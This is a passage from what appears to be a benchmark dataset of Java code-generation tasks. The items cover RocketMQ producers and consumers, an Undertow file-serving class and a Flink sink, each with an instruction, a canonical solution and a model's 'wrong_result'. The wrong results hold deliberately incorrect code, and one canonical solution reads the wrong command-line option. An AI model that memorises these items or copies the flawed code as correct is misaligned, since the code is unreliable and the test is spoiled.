    "wrong_result": "public class Consumer implements FactoryBean<DefaultMQPushConsumer>, InitializingBean, DisposableBean {\n    private String consumerGroup;\n    private String namesrvAddr;\n    private String instanceName;\n    private MessageModel messageModel;\n    private int consumeThreadMin;\n    private int consumeThreadMax;\n    private int pullThresholdForQueue;\n    private int pullThresholdSizeForQueue;\n    private int consumeMessageBatchMaxSize;\n    private int pullBatchSize;\n    private int maxReconsumeTimes;\n    private long consumeTimeout;\n    private String topic;\n    private String tags;\n    private MessageListenerConcurrently messageListener;\n    private DefaultMQPushConsumer consumer;\n\n    public Consumer() {\n        this.consumer = new DefaultMQPushConsumer();\n    }\n\n    @Override\n    public void afterPropertiesSet() {\n        consumer.setConsumerGroup(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n        consumer.setInstanceName(instanceName);\n        consumer.setMessageModel(messageModel);\n        consumer.setConsumeThreadMin(consumeThreadMin);\n        consumer.setConsumeThreadMax(consumeThreadMax);\n        consumer.setPullThresholdForQueue(pullThresholdForQueue);\n        consumer.setPullThresholdSizeForQueue(pullThresholdSizeForQueue);\n        consumer.setConsumeMessageBatchMaxSize(consumeMessageBatchMaxSize);\n        consumer.setPullBatchSize(pullBatchSize);\n        consumer.setMaxReconsumeTimes(maxReconsumeTimes);\n        consumer.setConsumeTimeout(consumeTimeout);\n        consumer.subscribe(topic, tags.split(\",\"));\n        consumer.setMessageListener(messageListener);\n        consumer.start();\n    }\n\n    @Override\n    public void destroy() {\n        if (consumer != null) {\n            consumer.shutdown();\n        }\n    }\n\n    @Override\n    public DefaultMQPushConsumer getObject() {\n        return consumer;\n    }\n\n    @Override\n    public Class<?> getObjectType() {\n        return DefaultMQPushConsumer.class;\n    }\n\n    @Override\n    public boolean isSingleton() {\n        return true;\n    }\n\n    public void setConsumerGroup(String consumerGroup) {\n        this.consumerGroup = consumerGroup;\n    }\n\n    public void setNamesrvAddr(String namesrvAddr) {\n        this.namesrvAddr = namesrvAddr;\n    }\n\n    public void setInstanceName(String instanceName) {\n        this.instanceName = instanceName;\n    }\n\n    public void setMessageModel(String messageModel) {\n        this.messageModel = MessageModel.valueOf(messageModel);\n    }\n\n    public void setConsumeThreadMin(int consumeThreadMin) {\n        this.consumeThreadMin = consumeThreadMin;\n    }\n\n    public void setConsumeThreadMax(int consumeThreadMax) {\n        this.consumeThreadMax = consumeThreadMax;\n    }\n\n    public void setPullThresholdForQueue(int pullThresholdForQueue) {\n        this.pullThresholdForQueue = pullThresholdForQueue;\n    }\n\n    public void setPullThresholdSizeForQueue(int pullThresholdSizeForQueue) {\n        this.pullThresholdSizeForQueue = pullThresholdSizeForQueue;\n    }\n\n    public void setConsumeMessageBatchMaxSize(int consumeMessageBatchMaxSize) {\n        this.consumeMessageBatchMaxSize = consumeMessageBatchMaxSize;\n    }\n\n    public void setPullBatchSize(int pullBatchSize) {\n        this.pullBatchSize = pullBatchSize;\n    }\n\n    public void setMaxReconsumeTimes(int maxReconsumeTimes) {\n        this.maxReconsumeTimes = maxReconsumeTimes;\n    }\n\n    public void setConsumeTimeout(long consumeTimeout) {\n        this.consumeTimeout = consumeTimeout;\n    }\n\n    public void setTopic(String topic) {\n        this.topic = topic;\n    }\n\n    public void setTags(String tags) {\n        this.tags = tags;\n    }\n\n    public void setMessageListener(MessageListenerConcurrently messageListener) {\n        this.messageListener = messageListener;\n    }\n}"
  },
  {
    "Task_id": 377,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ push consumer with namespace support to asynchronously consume messages from a specified topic.\n\nClass Description: The PushConsumerWithNamespace class is designed to consume messages from a RocketMQ topic using a push-based model. It supports namespace configuration and provides methods to initialize, start, and shutdown the consumer. The consumer processes messages concurrently and prints message details to the console.\n\nAttributes:\n- NAMESPACE: [String] - The namespace identifier for the RocketMQ instance\n- CONSUMER_GROUP: [String] - The consumer group name\n- DEFAULT_NAMESRVADDR: [String] - The NameServer address\n- TOPIC: [String] - The topic to subscribe to\n- consumer: [DefaultMQPushConsumer] - The RocketMQ push consumer instance\n\nMethods:\n- initializeConsumer(): [void]() -> [void] - Initializes the consumer with namespace, NameServer address, topic subscription, and message listener configuration\n- startConsumer(): [void]() -> [void] - Starts the consumer to begin message consumption\n- shutdownConsumer(): [void]() -> [void] - Shuts down the consumer gracefully",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\n\npublic class PushConsumerWithNamespace {\n    public static final String NAMESPACE = \"InstanceTest\";\n    public static final String CONSUMER_GROUP = \"cidTest\";\n    public static final String DEFAULT_NAMESRVADDR = \"127.0.0.1:9876\";\n    public static final String TOPIC = \"NAMESPACE_TOPIC\";\n\n    private DefaultMQPushConsumer consumer;\n\n    public void initializeConsumer() throws Exception {\n        consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);\n        consumer.setNamespaceV2(NAMESPACE);\n        consumer.setNamesrvAddr(DEFAULT_NAMESRVADDR);\n        consumer.subscribe(TOPIC, \"*\");\n        consumer.registerMessageListener((MessageListenerConcurrently) (msgs, context) -> {\n            msgs.forEach(msg -> System.out.printf(\"Msg topic is:%s, MsgId is:%s, reconsumeTimes is:%s%n\", \n                msg.getTopic(), msg.getMsgId(), msg.getReconsumeTimes()));\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        });\n    }\n\n    public void startConsumer() throws Exception {\n        consumer.start();\n    }\n\n    public void shutdownConsumer() {\n        consumer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "public class PushConsumerWithNamespace {\n    private String NAMESPACE;\n    private String CONSUMER_GROUP;\n    private String DEFAULT_NAMESRVADDR;\n    private String TOPIC;\n    private DefaultMQPushConsumer consumer;\n\n    public void initializeConsumer() {\n        consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);\n        consumer.setNamesrvAddr(DEFAULT_NAMESRVADDR);\n        consumer.setNamespace(NAMESPACE);\n        consumer.subscribe(TOPIC, \"*\");\n        consumer.setMessageListener((msgs, context) -> {\n            for (MessageExt msg : msgs) {\n                System.out.println(\"Received message: \" + new String(msg.getBody()));\n                System.out.println(\"Topic: \" + msg.getTopic());\n                System.out.println(\"Tags: \" + msg.getTags());\n                System.out.println(\"Keys: \" + msg.getKeys());\n            }\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        });\n    }\n\n    public void startConsumer() {\n        try {\n            consumer.start();\n        } catch (MQClientException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void shutdownConsumer() {\n        consumer.shutdown();\n    }\n}"
  },
  {
    "Task_id": 38,
    "Instruction": "Task Description: Implement a resource handler class that serves file content from a specified path, supporting both full file serving and range requests, using Java NIO's FileChannel for efficient file operations.\n\nClass Description: PathResource is a file resource handler that serves content from a file system path, supporting standard and ranged requests. It utilizes FileChannel for efficient reading and implements resource management through a PathResourceManager.\n\nAttributes:\n- file: Path - The file path to serve content from\n- manager: PathResourceManager - Manages resource access and transfer size thresholds\n\nMethods:\n- serve(Sender, HttpServerExchange, IoCallback) -> void - Serves the entire file content to the client\n- serveRange(Sender, HttpServerExchange, long, long, IoCallback) -> void - Serves a specific byte range of the file content\n- getContentLength() -> Long - Returns the size of the file in bytes or null if unavailable\n- serveImpl(Sender, HttpServerExchange, long, long, IoCallback, boolean) -> void - Internal implementation handling both full and ranged requests\n\nThe class uses nested BaseFileTask, ServerTask, and TransferTask classes to handle different serving strategies:\n- ServerTask: Reads file content in chunks using pooled buffers\n- TransferTask: Uses zero-copy transfer for efficient large file serving\n\nThe implementation demonstrates proper FileChannel usage including:\n1. Opening channels with StandardOpenOption.READ\n2. Position manipulation for range requests\n3. Proper resource cleanup with safeClose\n4. Buffer management with PooledByteBuffer\n5. Error handling for file operations",
    "Canonical_solution": "import io.undertow.io.IoCallback;\nimport io.undertow.io.Sender;\nimport io.undertow.server.HttpServerExchange;\nimport io.undertow.connector.PooledByteBuffer;\nimport org.xnio.IoUtils;\n\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Files;\nimport java.nio.file.NoSuchFileException;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class PathResource implements RangeAwareResource {\n\n    private final Path file;\n    private final PathResourceManager manager;\n\n    public PathResource(final Path file, final PathResourceManager manager, String path) {\n        this.file = file;\n        this.manager = manager;\n    }\n\n    @Override\n    public void serve(final Sender sender, final HttpServerExchange exchange, final IoCallback callback) {\n        serveImpl(sender, exchange, -1, -1, callback, false);\n    }\n\n    @Override\n    public void serveRange(final Sender sender, final HttpServerExchange exchange, final long start, final long end, final IoCallback callback) {\n        serveImpl(sender, exchange, start, end, callback, true);\n    }\n\n    private void serveImpl(final Sender sender, final HttpServerExchange exchange, final long start, final long end, final IoCallback callback, final boolean range) {\n        abstract class BaseFileTask implements Runnable {\n            protected volatile FileChannel fileChannel;\n\n            protected boolean openFile() {\n                try {\n                    fileChannel = FileChannel.open(file, StandardOpenOption.READ);\n                    if(range) {\n                        fileChannel.position(start);\n                    }\n                } catch (NoSuchFileException e) {\n                    exchange.setStatusCode(StatusCodes.NOT_FOUND);\n                    callback.onException(exchange, sender, e);\n                    return false;\n                } catch (IOException e) {\n                    exchange.setStatusCode(StatusCodes.INTERNAL_SERVER_ERROR);\n                    callback.onException(exchange, sender, e);\n                    return false;\n                }\n                return true;\n            }\n        }\n\n        class ServerTask extends BaseFileTask implements IoCallback {\n            private PooledByteBuffer pooled;\n            long remaining = end - start + 1;\n\n            @Override\n            public void run() {\n                if(range && remaining == 0) {\n                    if (pooled != null) {\n                        pooled.close();\n                        pooled = null;\n                    }\n                    IoUtils.safeClose(fileChannel);\n                    callback.onComplete(exchange, sender);\n                    return;\n                }\n                if (fileChannel == null) {\n                    if (!openFile()) {\n                        return;\n                    }\n                    pooled = exchange.getConnection().getByteBufferPool().allocate();\n                }\n                if (pooled != null) {\n                    ByteBuffer buffer = pooled.getBuffer();\n                    try {\n                        buffer.clear();\n                        int res = fileChannel.read(buffer);\n                        if (res == -1) {\n                            pooled.close();\n                            IoUtils.safeClose(fileChannel);\n                            callback.onComplete(exchange, sender);\n                            return;\n                        }\n                        buffer.flip();\n                        if(range) {\n                            if(buffer.remaining() > remaining) {\n                                buffer.limit((int) (buffer.position() + remaining));\n                            }\n                            remaining -= buffer.remaining();\n                        }\n                        sender.send(buffer, this);\n                    } catch (IOException e) {\n                        onException(exchange, sender, e);\n                    }\n                }\n            }\n\n            @Override\n            public void onComplete(final HttpServerExchange exchange, final Sender sender) {\n                if (exchange.isInIoThread()) {\n                    exchange.dispatch(this);\n                } else {\n                    run();\n                }\n            }\n\n            @Override\n            public void onException(final HttpServerExchange exchange, final Sender sender, final IOException exception) {\n                if (pooled != null) {\n                    pooled.close();\n                    pooled = null;\n                }\n                IoUtils.safeClose(fileChannel);\n                if (!exchange.isResponseStarted()) {\n                    exchange.setStatusCode(StatusCodes.INTERNAL_SERVER_ERROR);\n                }\n                callback.onException(exchange, sender, exception);\n            }\n        }\n\n        class TransferTask extends BaseFileTask {\n            @Override\n            public void run() {\n                if (!openFile()) {\n                    return;\n                }\n                sender.transferFrom(fileChannel, new IoCallback() {\n                    @Override\n                    public void onComplete(HttpServerExchange exchange, Sender sender) {\n                        try {\n                            IoUtils.safeClose(fileChannel);\n                        } finally {\n                            callback.onComplete(exchange, sender);\n                        }\n                    }\n\n                    @Override\n                    public void onException(HttpServerExchange exchange, Sender sender, IOException exception) {\n                        try {\n                            IoUtils.safeClose(fileChannel);\n                        } finally {\n                            callback.onException(exchange, sender, exception);\n                        }\n                    }\n                });\n            }\n        }\n\n        BaseFileTask task;\n        try {\n            task = manager.getTransferMinSize() > Files.size(file) || range ? new ServerTask() : new TransferTask();\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n        if (exchange.isInIoThread()) {\n            exchange.dispatch(task);\n        } else {\n            task.run();\n        }\n    }\n\n    @Override\n    public Long getContentLength() {\n        try {\n            if (Files.isSymbolicLink(file) && Files.notExists(file)) {\n                return null;\n            }\n            return Files.size(file);\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public class PathResource {\n    private final Path file;\n    private final PathResourceManager manager;\n    private final FileChannel channel;\n    private final Long fileSize;\n\n    public PathResource(Path file, PathResourceManager manager) throws IOException {\n        this.file = file;\n        this.manager = manager;\n        this.channel = FileChannel.open(file, StandardOpenOption.READ);\n        this.fileSize = Files.size(file);\n    }\n\n    public void serve(Sender sender, HttpServerExchange exchange, IoCallback callback) {\n        serveImpl(sender, exchange, 0, fileSize, callback, false);\n    }\n\n    public void serveRange(Sender sender, HttpServerExchange exchange, long start, long end, IoCallback callback) {\n        serveImpl(sender, exchange, start, end, callback, true);\n    }\n\n    public Long getContentLength() {\n        return fileSize;\n    }\n\n    private void serveImpl(Sender sender, HttpServerExchange exchange, long start, long end, IoCallback callback, boolean isRange) {\n        long threshold = manager.getTransferSizeThreshold();\n        if (fileSize > threshold) {\n            new TransferTask(sender, exchange, start, end, callback).execute();\n        } else {\n            new ServerTask(sender, exchange, start, end, callback).execute();\n        }\n    }\n\n    private class ServerTask extends BaseFileTask {\n        private final Sender sender;\n        private final HttpServerExchange exchange;\n        private final long start;\n        private final long end;\n        private final IoCallback callback;\n\n        public ServerTask(Sender sender, HttpServerExchange exchange, long start, long end, IoCallback callback) {\n            this.sender = sender;\n            this.exchange = exchange;\n            this.start = start;\n            this.end = end;\n            this.callback = callback;\n        }\n\n        @Override\n        public void execute() {\n            try {\n                channel.position(start);\n                long remaining = Math.min(end, fileSize) - start;\n                ByteBuffer buffer = PooledByteBuffer.allocateDirect(8192);\n                while (remaining > 0) {\n                    int read = channel.read(buffer);\n                    if (read == -1) break;\n                    buffer.flip();\n                    callback.onData(buffer);\n                    buffer.clear();\n                    remaining -= read;\n                }\n                callback.onComplete();\n            } catch (IOException e) {\n                callback.onError(e);\n            }\n        }\n    }\n\n    private class TransferTask extends BaseFileTask {\n        private final Sender sender;\n        private final HttpServerExchange exchange;\n        private final long start;\n        private final long end;\n        private final IoCallback callback;\n\n        public TransferTask(Sender sender, HttpServerExchange exchange, long start, long end, IoCallback callback) {\n            this.sender = sender;\n            this.exchange = exchange;\n            this.start = start;\n            this.end = end;\n            this.callback = callback;\n        }\n\n        @Override\n        public void execute() {\n            try {\n                channel.position(start);\n                long transferSize = Math.min(end, fileSize) - start;\n                channel.transferTo(start, transferSize, sender);\n                callback.onComplete();\n            } catch (IOException e) {\n                callback.onError(e);\n            }\n        }\n    }\n\n    public void close() throws IOException {\n        if (channel != null) {\n            channel.close();\n        }\n    }\n\n    private abstract static class BaseFileTask {\n        public abstract void execute();\n    }\n}"
  },
  {
    "Task_id": 380,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ consumer to asynchronously receive and process messages from a specified topic, measuring the delay between message delivery and consumption.\n\nClass Description: The TimerConsumer class is a RocketMQ push consumer that subscribes to a specified topic, processes incoming messages, and calculates the time delay between when messages were delivered and when they were consumed. It provides command-line configuration for NameServer address and topic name.\n\nAttributes:\n- topic: String - The RocketMQ topic to subscribe to for messages\n- consumer: DefaultMQPushConsumer - The RocketMQ push consumer instance that handles message consumption\n\nMethods:\n- TimerConsumer(String[] args) - Constructor - Initializes the consumer with command-line arguments for NameServer address and topic\n  Input: args: String[] - Command-line arguments containing optional NameServer address and topic\n  Output: None\n\n- start() - void - Starts the consumer, subscribes to the topic, and registers a message listener\n  Input: None\n  Output: None (throws MQClientException if startup fails)\n\n- buildCommandlineOptions(Options options) - Options - Helper method to define command-line options\n  Input: options: Options - Apache Commons CLI Options object to extend\n  Output: Options - The extended Options object with consumer-specific options",
    "Canonical_solution": "import org.apache.commons.cli.CommandLine;\nimport org.apache.commons.cli.DefaultParser;\nimport org.apache.commons.cli.Option;\nimport org.apache.commons.cli.Options;\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.ThreadFactoryImpl;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.srvutil.ServerUtil;\n\nimport java.util.List;\nimport java.util.concurrent.ScheduledExecutorService;\nimport java.util.concurrent.ScheduledThreadPoolExecutor;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.atomic.AtomicLong;\n\npublic class TimerConsumer {\n    private final String topic;\n    private final DefaultMQPushConsumer consumer;\n\n    public TimerConsumer(String[] args) {\n        Options options = ServerUtil.buildCommandlineOptions(new Options());\n        final CommandLine commandLine = ServerUtil.parseCmdLine(\"benchmarkTimerConsumer\", args, buildCommandlineOptions(options), new DefaultParser());\n        if (null == commandLine) {\n            System.exit(-1);\n        }\n\n        final String namesrvAddr = commandLine.hasOption('n') ? commandLine.getOptionValue('t').trim() : \"localhost:9876\";\n        topic = commandLine.hasOption('t') ? commandLine.getOptionValue('t').trim() : \"BenchmarkTest\";\n        System.out.printf(\"namesrvAddr: %s, topic: %s%n\", namesrvAddr, topic);\n\n        consumer = new DefaultMQPushConsumer(\"benchmark_consumer\");\n        consumer.setInstanceName(Long.toString(System.currentTimeMillis()));\n        consumer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() throws MQClientException {\n        consumer.subscribe(topic, \"*\");\n\n        consumer.registerMessageListener(new MessageListenerConcurrently() {\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n                MessageExt msg = msgs.get(0);\n                long now = System.currentTimeMillis();\n\n                long deliverTimeMs = Long.parseLong(msg.getProperty(\"MY_RECORD_TIMER_DELIVER_MS\"));\n                long delayedDuration = now - deliverTimeMs;\n\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            }\n        });\n\n        consumer.start();\n        System.out.printf(\"Start receiving messages%n\");\n    }\n\n    private Options buildCommandlineOptions(Options options) {\n        Option opt = new Option(\"n\", \"namesrvAddr\", true, \"Nameserver address, default: localhost:9876\");\n        opt.setRequired(false);\n        options.addOption(opt);\n\n        opt = new Option(\"t\", \"topic\", true, \"Send messages to which topic, default: BenchmarkTest\");\n        opt.setRequired(false);\n        options.addOption(opt);\n\n        return options;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "public class TimerConsumer {\n    private String topic;\n    private DefaultMQPushConsumer consumer;\n\n    public TimerConsumer(String[] args) {\n        Options options = new Options();\n        buildCommandlineOptions(options);\n        CommandLine cmd = null;\n        try {\n            cmd = new DefaultParser().parse(options, args);\n        } catch (ParseException e) {\n            e.printStackTrace();\n            System.exit(1);\n        }\n\n        String nameServer = cmd.getOptionValue(\"n\");\n        String topic = cmd.getOptionValue(\"t\");\n\n        if (nameServer == null) {\n            nameServer = \"localhost:9876\";\n        }\n        if (topic == null) {\n            topic = \"TestTopic\";\n        }\n\n        this.topic = topic;\n        this.consumer = new DefaultMQPushConsumer(\"TimerConsumerGroup\");\n        this.consumer.setNamesrvAddr(nameServer);\n    }\n\n    public void start() {\n        try {\n            consumer.subscribe(topic, \"*\");\n            consumer.registerMessageListener(new MessageListenerConcurrently() {\n                @Override\n                public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n                    for (MessageExt msg : msgs) {\n                        long deliveryTime = msg.getBirthTimestamp().getTime();\n                        long consumeTime = System.currentTimeMillis();\n                        long delay = consumeTime - deliveryTime;\n                        System.out.println(\"Message received, delay: \" + delay + \" ms\");\n                        System.out.println(\"Message content: \" + new String(msg.getBody()));\n                    }\n                    return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n                }\n            });\n            consumer.start();\n            System.out.println(\"Consumer started.\");\n        } catch (MQClientException e) {\n            e.printStackTrace();\n            throw new RuntimeException(\"Failed to start consumer\", e);\n        }\n    }\n\n    private Options buildCommandlineOptions(Options options) {\n        options.addOption(\"n\", \"namesrv\", true, \"NameServer address\");\n        options.addOption(\"t\", \"topic\", true, \"RocketMQ topic to subscribe\");\n        return options;\n    }\n\n    public static void main(String[] args) {\n        TimerConsumer consumer = new TimerConsumer(args);\n        consumer.start();\n    }\n}"
  },
  {
    "Task_id": 382,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ producer capable of sending messages to both regular topics and LMQ (Light Message Queue) topics. The producer should support initialization, message sending with custom properties, and proper shutdown.\n\nClass Description: The LMQProducer class is a RocketMQ producer implementation that demonstrates how to send messages to both regular topics and LMQ topics. It handles producer lifecycle management and message sending with multi-dispatch capabilities.\n\nAttributes:\n- PRODUCER_GROUP: String - The name of the producer group\n- DEFAULT_NAMESRVADDR: String - Default NameServer address (format: \"ip:port\")\n- TOPIC: String - The main topic to which messages will be sent\n- TAG: String - The tag for messages\n- LMQ_TOPIC_1: String - First LMQ topic (prefixed with MixAll.LMQ_PREFIX)\n- LMQ_TOPIC_2: String - Second LMQ topic (prefixed with MixAll.LMQ_PREFIX)\n- producer: DefaultMQProducer - The RocketMQ producer instance\n\nMethods:\n- initialize() throws MQClientException -> void - Initializes the producer by creating a new DefaultMQProducer instance, setting the NameServer address, and starting the producer\n- sendMessage(int messageId) throws Exception -> SendResult - Creates and sends a message with the given ID, setting message keys and LMQ dispatch properties\n- shutdown() -> void - Shuts down the producer instance gracefully",
    "Canonical_solution": "import org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.MixAll;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.common.message.MessageConst;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\n\npublic class LMQProducer {\n    public static final String PRODUCER_GROUP = \"ProducerGroupName\";\n    public static final String DEFAULT_NAMESRVADDR = \"127.0.0.1:9876\";\n    public static final String TOPIC = \"TopicLMQParent\";\n    public static final String TAG = \"TagA\";\n    public static final String LMQ_TOPIC_1 = MixAll.LMQ_PREFIX + \"123\";\n    public static final String LMQ_TOPIC_2 = MixAll.LMQ_PREFIX + \"456\";\n\n    private DefaultMQProducer producer;\n\n    public void initialize() throws MQClientException {\n        producer = new DefaultMQProducer(PRODUCER_GROUP);\n        producer.setNamesrvAddr(DEFAULT_NAMESRVADDR);\n        producer.start();\n    }\n\n    public SendResult sendMessage(int messageId) throws Exception {\n        Message msg = new Message(TOPIC, TAG, (\"Hello RocketMQ \" + messageId).getBytes(RemotingHelper.DEFAULT_CHARSET));\n        msg.setKeys(\"Key\" + messageId);\n        msg.putUserProperty(MessageConst.PROPERTY_INNER_MULTI_DISPATCH,\n            String.join(MixAll.LMQ_DISPATCH_SEPARATOR, LMQ_TOPIC_1, LMQ_TOPIC_2));\n        return producer.send(msg);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "wrong_result": "public class LMQProducer {\n    private static final String PRODUCER_GROUP = \"YourProducerGroup\";\n    private static final String DEFAULT_NAMESRVADDR = \"localhost:9876\";\n    private static final String TOPIC = \"YourTopic\";\n    private static final String TAG = \"YourTag\";\n    private static final String LMQ_TOPIC_1 = \"MixAll.LMQ_TOPIC_1\";\n    private static final String LMQ_TOPIC_2 = \"MixAll.LMQ_TOPIC_2\";\n    private DefaultMQProducer producer;\n\n    public void initialize() throws MQClientException {\n        producer = new DefaultMQProducer(PRODUCER_GROUP);\n        producer.setNamesrvAddr(DEFAULT_NAMESRVADDR);\n        producer.start();\n    }\n\n    public SendResult sendMessage(int messageId) throws Exception {\n        Message msg = new Message(TOPIC, TAG, String.valueOf(messageId).getBytes());\n        msg.putUserProperty(\"LMQ_TOPIC\", LMQ_TOPIC_1);\n        SendResult result = producer.send(msg);\n        Message lmqMsg1 = new Message(LMQ_TOPIC_1, TAG, String.valueOf(messageId).getBytes());\n        producer.send(lmqMsg1);\n        Message lmqMsg2 = new Message(LMQ_TOPIC_2, TAG, String.valueOf(messageId).getBytes());\n        producer.send(lmqMsg2);\n        return result;\n    }\n\n    public void shutdown() {\n        if (producer != null) {\n            producer.shutdown();\n        }\n    }\n}"
  },
  {
    "Task_id": 383,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ message producer sink for sending messages to RocketMQ topics, supporting both synchronous and asynchronous message delivery, batch processing, and configurable message delay levels.\n\nClass Description: The RocketMQSink class is a Flink-compatible sink that sends messages to RocketMQ. It handles message serialization, topic selection, and provides configurable message delivery options including synchronous/asynchronous sending, batch processing, and delayed message delivery.\n\nAttributes:\n- LOG: Logger - Logger instance for logging debug and error messages\n- producer: DefaultMQProducer - RocketMQ producer instance for sending messages\n- async: boolean - Flag indicating whether to use asynchronous message sending\n- props: Properties - Configuration properties for the producer\n- topicSelector: TopicSelector<IN> - Selector for determining message topics and tags\n- serializationSchema: KeyValueSerializationSchema<IN> - Schema for serializing input data\n- batchFlushOnCheckpoint: boolean - Flag indicating whether to use batch processing\n- batchSize: int - Maximum batch size for batch processing\n- batchList: List<Message> - Buffer for batch messages\n- messageDeliveryDelayLevel: int - Configuration for delayed message delivery\n\nMethods:\n- RocketMQSink(KeyValueSerializationSchema<IN>, TopicSelector<IN>, Properties) -> void - Constructor that initializes the sink with serialization schema, topic selector, and configuration properties\n- open(Configuration) -> void - Initializes the RocketMQ producer and prepares for message sending\n- invoke(IN) -> void - Processes and sends a single message (either immediately or adds to batch)\n- prepareMessage(IN) -> Message - Creates a RocketMQ Message object from input data\n- close() -> void - Cleans up resources and shuts down the producer\n- flushSync() -> void - Sends all batched messages synchronously (used when batch processing is enabled)",
    "Canonical_solution": "import com.zhisheng.connectors.rocketmq.common.selector.TopicSelector;\nimport com.zhisheng.connectors.rocketmq.common.serialization.KeyValueSerializationSchema;\nimport org.apache.commons.lang3.Validate;\nimport org.apache.flink.configuration.Configuration;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendCallback;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.nio.charset.StandardCharsets;\nimport java.util.LinkedList;\nimport java.util.List;\nimport java.util.Properties;\n\npublic class RocketMQSink<IN> {\n    private static final Logger LOG = LoggerFactory.getLogger(RocketMQSink.class);\n\n    private transient DefaultMQProducer producer;\n    private boolean async;\n    private Properties props;\n    private TopicSelector<IN> topicSelector;\n    private KeyValueSerializationSchema<IN> serializationSchema;\n    private boolean batchFlushOnCheckpoint;\n    private int batchSize = 1000;\n    private List<Message> batchList;\n    private int messageDeliveryDelayLevel;\n\n    public RocketMQSink(KeyValueSerializationSchema<IN> schema, TopicSelector<IN> topicSelector, Properties props) {\n        this.serializationSchema = schema;\n        this.topicSelector = topicSelector;\n        this.props = props;\n        this.messageDeliveryDelayLevel = RocketMQUtils.getInteger(this.props, RocketMQConfig.MSG_DELAY_LEVEL,\n                RocketMQConfig.MSG_DELAY_LEVEL00);\n        if (this.messageDeliveryDelayLevel < RocketMQConfig.MSG_DELAY_LEVEL00) {\n            this.messageDeliveryDelayLevel = RocketMQConfig.MSG_DELAY_LEVEL00;\n        } else if (this.messageDeliveryDelayLevel > RocketMQConfig.MSG_DELAY_LEVEL18) {\n            this.messageDeliveryDelayLevel = RocketMQConfig.MSG_DELAY_LEVEL18;\n        }\n    }\n\n    public void open(Configuration parameters) throws Exception {\n        Validate.notEmpty(props, \"Producer properties can not be empty\");\n        Validate.notNull(topicSelector, \"TopicSelector can not be null\");\n        Validate.notNull(serializationSchema, \"KeyValueSerializationSchema can not be null\");\n\n        producer = new DefaultMQProducer();\n        producer.setInstanceName(String.valueOf(getRuntimeContext().getIndexOfThisSubtask()));\n        RocketMQConfig.buildProducerConfigs(props, producer);\n        batchList = new LinkedList<>();\n\n        try {\n            producer.start();\n        } catch (MQClientException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public void invoke(IN input) throws Exception {\n        Message msg = prepareMessage(input);\n\n        if (batchFlushOnCheckpoint) {\n            batchList.add(msg);\n            if (batchList.size() >= batchSize) {\n                flushSync();\n            }\n            return;\n        }\n\n        if (async) {\n            try {\n                producer.send(msg, new SendCallback() {\n                    @Override\n                    public void onSuccess(SendResult sendResult) {\n                        LOG.debug(\"Async send message success! result: {}\", sendResult);\n                    }\n\n                    @Override\n                    public void onException(Throwable throwable) {\n                        if (throwable != null) {\n                            LOG.error(\"Async send message failure!\", throwable);\n                        }\n                    }\n                });\n            } catch (Exception e) {\n                LOG.error(\"Async send message failure!\", e);\n            }\n        } else {\n            try {\n                SendResult result = producer.send(msg);\n                LOG.debug(\"Sync send message result: {}\", result);\n            } catch (Exception e) {\n                LOG.error(\"Sync send message failure!\", e);\n            }\n        }\n    }\n\n    private Message prepareMessage(IN input) {\n        String topic = topicSelector.getTopic(input);\n        String tag = topicSelector.getTag(input) != null ? topicSelector.getTag(input) : \"\";\n\n        byte[] k = serializationSchema.serializeKey(input);\n        String key = k != null ? new String(k, StandardCharsets.UTF_8) : \"\";\n        byte[] value = serializationSchema.serializeValue(input);\n\n        Validate.notNull(topic, \"the message topic is null\");\n        Validate.notNull(value, \"the message body is null\");\n\n        Message msg 